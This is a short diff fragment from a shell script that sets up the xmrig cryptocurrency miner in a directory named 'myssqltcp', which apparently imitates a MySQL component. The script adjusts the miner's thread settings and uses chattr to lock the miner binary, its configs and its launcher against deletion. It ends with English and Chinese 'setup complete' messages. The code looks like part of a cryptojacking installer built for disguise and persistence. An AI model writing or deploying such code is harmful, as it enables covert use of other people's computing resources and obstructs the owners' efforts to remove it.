@@ -907,10 +907,10 @@ else
   echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HOME/myssqltcp/config_background.json"
 fi
 chattr -R +ia $HOME/myssqltcp
-chattr -V +iau $HOME/myssqltcp/xmrig
-chattr -V +iau $HOME/myssqltcp/config_background.json
-chattr -V +iau $HOME/myssqltcp/config.json
-chattr -V +iau $HOME/myssqltcp/xmrig.sh
+chattr -V +ia $HOME/myssqltcp/xmrig
+chattr -V +ia $HOME/myssqltcp/config_background.json
+chattr -V +ia $HOME/myssqltcp/config.json
+chattr -V +ia $HOME/myssqltcp/xmrig.sh
 
 echo "[*] Setup complete"
 echo "[*] 安装完成"
